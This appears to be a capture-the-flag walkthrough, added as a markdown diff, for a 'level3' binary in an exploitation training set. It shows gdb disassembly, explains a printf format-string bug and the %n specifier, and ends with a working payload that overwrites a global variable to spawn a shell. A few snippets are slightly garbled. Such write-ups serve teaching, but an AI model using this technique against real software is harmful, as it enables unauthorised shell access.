@@ -1,0 +1,248 @@
+# Level3 Exploit Walkthrough
+
+first of all i run the program with "./level3":
+
+- the program is reading from standard input,
+  so i can type something in the terminal and it will (maybe) be processed by the program.
+
+- then i wonder if it can be exploited by something in the input.
+
+- i try to type some random characters and see if it will cause any error or unexpected behavior,
+  but nothing happens instead of printing my input.
+
+this time i want to know more about the program, so i decide to know it's assembly code:
+
+- i use:
+
+```bash
+echo 'disassemble main' | gdb -q ./level3
+```
+
+to disassemble the main function.
+
+- it only calls other function "v".
+
+- then i use:
+
+```bash
+echo 'disassemble v' | gdb -q ./level3
+```
+
+to disassemble the function "v".
+
+- it looking weird at first, but after some analysis i find that it is actually do something
+  i can use to exploit the program:
+
+    - it reserve some space on the stack for local variables:
+
+    ```asm
+    sub    $0x218,%esp
+    ```
+
+    - then it call "fgets" function to read input from standard input
+      and store it in the reserved space:
+
+    ```asm
+    call   0x80483a0 <fgets@plt>
+    ```
+
+    why fgets not gets? after research i found that fgets control the max size can read from a file
+
+by using gdb i found there is compare operation with a global variable at:
+
+```text
+0x804988c
+```
+
+if equal to:
+
+```text
+0x40
+```
+
+the program successfully execute "/bin/sh".
+
+then i realize i need to modify this global variable value.
+
+after learning about exploitations methods 
+i found The Format String Exploitation wich make the user be abel to :
+use the %n specifier to overwrite memory addresses.
+
+at the v function assembly code, i found:
+
+```asm
+mov    0x8049860,%eax
+mov    %eax,0x8(%esp)
+movl   $0x200,0x4(%esp)
+lea    -0x208(%ebp),%eax
+mov    %eax,(%esp)
+call   0x80483a0 <fgets@plt>
+
+-0x208(%ebp),%eax
+mov    %eax,(%esp)
+call   0x8048390 <printf@plt>
+```
+
+equivalent to:
+```c
+fgets(buffer, 0x200, stdin);
+printf(buffer);
+```
+
+so user input is passed directly to printf as format string.
+
+the goal now is to write `0x40` into `0x804988c`
+using the format string vulnerability of printf.
+
+this assign the number of written bytes to an address.
+
+example:
+
+```c
+printf("AAAA%n", &var);
+```
+
+prints 4 chars and writes 4 into `var`.
+
+here i already have the address of the variable:
+
+```text
+0x0804988c
+```
+
+and i need to write:
+
+```text
+64 (0x40)
+```
+
+bytes to stdout so `%n` will store 64 into `0x804988c`.
+
+as we know variadic functions recive it's parrameters as :
+
+```text
+HIGH MEMORY
+|-------------------------|
+|  str (pointer)          |  [esp + 16] -> 4th argument
+|-------------------------|
+|  char (value)           |  [esp + 12] -> 3rd argument
+|-------------------------|
+|  int   (value)          |  [esp + 8]  -> 2nd argument
+|-------------------------|
+|  Format String Pointer  |  [esp + 4]  -> 1st argument ("%d,%c,%s") string format
+|-------------------------|
+|  Return Address         |  [esp]      -> Added automatically by "call"
+|-------------------------|
+LOW MEMORY (<-- Current %esp)
+```
+
+the function printf depend entirly on the firt parrameter (String Format),
+to detect which var it's get from stack and by wich format "%nscf..."
+so i can access to variables on stack memory even if it not passed as argument to printf
+
+from this test:
+
+```bash
+python -c 'print "AAAA" + " %x"*20' | ./level3
+```
+
+we get:
+
+```text
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 ...
+```
+
+which mean:
+
+```text
+AAAA -> 0x41414141
+```
+
+now count stack outputs:
+
+```text
+1 -> 200
+2 -> b7fd1ac0
+3 -> b7ff37d0
+4 -> 41414141
+```
+
+that means we need to pass all args before 41414141 to control "41414141"
+
+so:
+
+```bash
+python -c 'print "AAAA %x %x %x %p"' | ./level3 
+AAAA 200 b7fd1ac0 b7ff37d0 0x41414141
+```
+
+so if we place an address instead of "AAAA",
+printf will interpret it as an argument.
+
+the idea becomes:
+
+```c
+printf("64(printed char)%n", &0x0804988c);
+```
+
+equ:
+
+```bash
+python -c 'print "\x8c\x98\x04\x08%x%x%x" + "A"*0 + "%n"' | ./level3 
+AAAA 200 b7fd1ac0 b7ff37d0 0x41414141
+```
+
+i use gdb to find exact n sould i set to overwrite m variable with 64
+
+```bash
+level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08%x%x%x" + "A"*0 + "%n"' > /tmp/input
+level3@RainFall:~$ gdb level3 
+(gdb) disas v 
+Dump of assembler code for function v:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x218,%esp
+   0x080484ad <+9>:	mov    0x8049860,%eax
+   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484be <+26>:	lea    -0x208(%ebp),%eax
+   0x080484c4 <+32>:	mov    %eax,(%esp)
+   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+   0x080484d2 <+46>:	mov    %eax,(%esp)
+   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+   0x080484e4 <+64>:	mov    0x8049880,%eax
+   0x080484e9 <+69>:	mov    %eax,%edx
+   0x080484eb <+71>:	mov    $0x8048600,%eax
+   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
+   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
+   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
+   0x08048504 <+96>:	mov    %eax,(%esp)
+   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
+   0x0804850c <+104>:	movl   $0x804860d,(%esp)
+   0x08048513 <+111>:	call   0x80483c0 <system@plt>
+   0x08048518 <+116>:	leave  
+   0x08048519 <+117>:	ret    
+End of assembler dump.
+(gdb) b *0x080484df
+Breakpoint 1 at 0x80484df
+(gdb) run </tmp/input 
+Starting program: /home/user/level3/level3 </tmp/input
+?200b7fd1ac0b7ff37d0
+
+Breakpoint 1, 0x080484df in v ()
+(gdb) x/dw 0x804988c
+0x804988c <m>:	23
+(gdb) 
+```
+
+so i need to add 64 - 23 to "A" * 0 ---> "A" * 41
+
+finally the input will be:
+
+```bash
+python -c 'print "\x8c\x98\x04\x08%x%x%x" + "A"*41 + "%n"' | ./level3
+```
